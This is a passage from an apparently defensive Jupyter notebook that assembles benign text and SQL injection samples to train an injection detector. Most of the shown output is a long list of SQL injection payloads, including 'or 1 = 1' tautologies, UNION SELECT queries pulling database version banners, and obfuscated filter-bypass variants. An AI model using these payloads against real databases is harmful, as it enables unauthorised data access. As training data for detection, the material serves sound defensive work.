       "      <td>Commands all light, all influence, all fate;</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                         benign\n",
       "0                           Add plain text here\n",
       "1                    “Ne te quaesiveris extra.”\n",
       "2   “Man is his own star; and the soul that can\n",
       "3           Render an honest and a perfect man,\n",
       "4  Commands all light, all influence, all fate;"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "01d927f0",
   "metadata": {},
   "outputs": [],
   "source": [
    "plain_text=df['benign'].values "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "bdb838c4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['Add plain text here', '“Ne te quaesiveris extra.”',\n",
       "       '“Man is his own star; and the soul that can',\n",
       "       'Render an honest and a perfect man,',\n",
       "       'Commands all light, all influence, all fate;'], dtype=object)"
      ]
     },
     "execution_count": 48,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "plain_text[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "ec80d985",
   "metadata": {},
   "outputs": [],
   "source": [
    "plain_text=plain_text[:-22] # removed last 22 records that were urls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "id": "62e43860",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3672"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(plain_text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "eb88ac0d",
   "metadata": {},
   "outputs": [],
   "source": [
    "# convert from list to string\n",
    "\n",
    "data=''\n",
    "for x in plain_text:\n",
    "    data+=\" \" + x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "537f1e78",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "str"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "type(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "8ebc9de0",
   "metadata": {},
   "outputs": [],
   "source": [
    "data=fun_remove_stop_words(data)  # remove stop words\n",
    "data=data.split('.')              # split sentences"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "7d73c0df",
   "metadata": {},
   "outputs": [],
   "source": [
    "# seperate words inside tags\n",
    "\n",
    "for i in range(len(data)):\n",
    "    data[i]=data[i].replace('<', ' <')\n",
    "    data[i]=data[i].replace('>', '> ')\n",
    "    data[i]=data[i].replace('=', ' = ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "255f0cc3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['  Add plain text “Ne te quaesiveris extra',\n",
       " '” “Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late',\n",
       " ' Our acts angels are, good ill, Our fatal shadows walk us still',\n",
       " '” Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet',\n",
       " ' I read day verses written eminent painter original conventional']"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "6f2d6628",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Benign records: 3072\n"
     ]
    }
   ],
   "source": [
    "print(\"Benign records: %2i\" %len(data))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "9a1afbf0",
   "metadata": {},
   "outputs": [],
   "source": [
    "# read self created benign data\n",
    "\n",
    "path=\"C:/Users/tanuj/Downloads/benign_for_training.txt\"\n",
    "benign_data=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    benign_data.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "6d2a5233",
   "metadata": {},
   "outputs": [],
   "source": [
    "# read self created sqli data\n",
    "\n",
    "path=\"C:/Users/tanuj/Downloads/sqli_for_training.txt\"\n",
    "sqli_data=[]\n",
    "f = open(path, \"r\",encoding='utf-8')\n",
    "for x in f:\n",
    "    sqli_data.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "id": "966bdfd0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "440"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(benign_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "id": "ad0c4b4d",
   "metadata": {},
   "outputs": [],
   "source": [
    "benign_sentence=[]\n",
    "for i in benign_data:\n",
    "    sentences=i.split('.')\n",
    "    \n",
    "    for sentence in sentences:\n",
    "        benign_sentence.append(sentence)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "id": "d0cf5caa",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1115"
      ]
     },
     "execution_count": 61,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(benign_sentence)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "id": "523b735b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total benign data :  4187\n"
     ]
    }
   ],
   "source": [
    "print(\"total benign data : \" ,len(benign_sentence)+len(data))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "id": "a3523415",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "290"
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(sqli_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "id": "e6d7ca4f",
   "metadata": {},
   "outputs": [],
   "source": [
    "all_sqli_sentence=sql_lines_bypasses+sql_lines_camoufl4g3+sql_lines_fuzzing+sql_lines_Generic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "id": "9d158cf3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "960"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(all_sqli_sentence)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "id": "5dc89339",
   "metadata": {},
   "outputs": [],
   "source": [
    "def optional_numeric_to_numeric(all_sqli_sentence):\n",
    "    \n",
    "    for i in range(len(all_sqli_sentence)):\n",
    "        \n",
    "\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1 ', 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 1', 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"'1 \", \"'numeric \")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 1'\", \" numeric'\")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1,', 'numeric,')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"1\\ \", 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"‘1\", '‘numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 2 \", \" numeric \")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 3 ', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 3--', ' numeric--')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 4 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 5 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 6 ', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 7 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 8 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1234', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"22\", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 8 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 200 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"23 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('\"1', '\"numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1\"', '\"numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"7659\", 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 37 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 45 \", ' numeric ')\n",
    "    \n",
    "    return all_sqli_sentence"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "id": "683c1627",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1   or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\+<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \\\\+<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\+<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\. union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $+<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $+<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\. union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or !<@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or !<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or @`\\\\` union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + ( \\\\ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( \\\\ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1.&&1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.&&@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\. )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\. )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1.  union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1.  union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1. union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +\\\\. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1. <@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.<@. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.<@. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1.*1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1.<1# union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. <@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1.*\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1.<@$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.<@$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1.%@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.%@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 +1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 11<1# union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\+ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\+ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +\\\\+. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 -1<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +1<@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + \\\\+*\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + \\\\+*$ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select 1||1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1||@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 1$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 $,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 1a,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1<@$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select .1_,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1`\\\\`,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select .1$_,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1<@.,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 $$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select !<1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select +!<1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select +!<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select !<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @||1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @&&@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ 1$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select  @ $,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ 1a,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @<@$,version (  )  -- 1',\n",
       " ' select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select @ _,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ $_,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @<@.,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ $$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +$ . or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +$ . union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$ 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$+ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$+. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +$+. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$+ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + $+%\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + $+%1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + $+*\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + $+%$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 % ( \\\\ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 * ( \\\\ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 % ( 1 )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 % ( $ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 % ( @ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@.. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1<@.. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1  <@. union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 *\\\\. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@.$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@.$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 *1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 <1## union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@1$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@1$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 *\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 %$ . or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 *$ . union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 %$ 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@$_ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@$_ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@<@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 %!<1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1<@<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@<@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 %!<@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@&@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@$$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 &@ or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<\\\\ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<$ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1'   or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $<\\\\ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or $<\\\\. union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<\\\\. or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<\\\\. union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<1 or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<$ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<$ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or !<@ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \" (  ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( ,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( .\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( 1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \" ( ;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( ]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \" ( #\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( [\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( _\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\" (  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\" (  = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \" ( &\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( @\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( {\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" )  ( \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) ,\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) .\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) 1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \" ) ;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) ]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) [\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) $\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) @\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) {\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \", ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \", ) \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",.\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \",;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \",#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\", = 1 or 1 = 1 -- 1',\n",
